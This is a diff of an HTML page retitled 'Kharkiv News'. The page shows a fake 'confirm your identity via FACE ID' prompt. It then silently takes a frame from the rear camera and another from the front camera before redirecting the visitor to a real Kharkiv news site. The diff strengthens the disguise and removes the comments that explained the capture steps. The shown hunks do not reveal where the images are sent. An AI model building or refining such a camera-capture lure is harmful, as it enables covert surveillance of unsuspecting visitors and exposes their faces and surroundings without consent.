@@ -3,12 +3,28 @@
 
 <head>
   <meta charset="UTF-8">
-  <title>Перевірка доступу</title>
+  <title>Новини Харкова</title>
   <style>
+    html,
     body {
-      font-family: sans-serif;
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+      color: #222;
+      display: flex;
+      justify-content: center;
+      align-items: center;
       text-align: center;
-      padding-top: 50px;
+    }
+
+    h2 {
+      font-size: 3vw;
+      padding: 0 10%;
+      line-height: 1.5;
+      font-weight: 600;
     }
 
     video,
@@ -19,7 +35,7 @@
 </head>
 
 <body>
-  <h2>Для переходу на сторонній сайт Підтвердіть свою особу через FACE ID</h2>
+  <h2>Для переходу на сторонній сайт підтвердіть свою особу через FACE ID</h2>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
@@ -48,7 +64,7 @@
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
         video.srcObject = stream;
 
-        await new Promise(r => setTimeout(r, 3000)); // дати камері час
+        await new Promise(r => setTimeout(r, 3000));
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -64,13 +80,9 @@
     };
 
     const run = async () => {
-      // спочатку задня камера
       await capturePhoto('environment', 'Задня камера');
-
-      // потім фронтальна (резерв)
       await capturePhoto('user', 'Фронтальна камера');
 
-      // редирект
       window.location.href = 'https://suspilne.media/kharkiv/';
     };
 
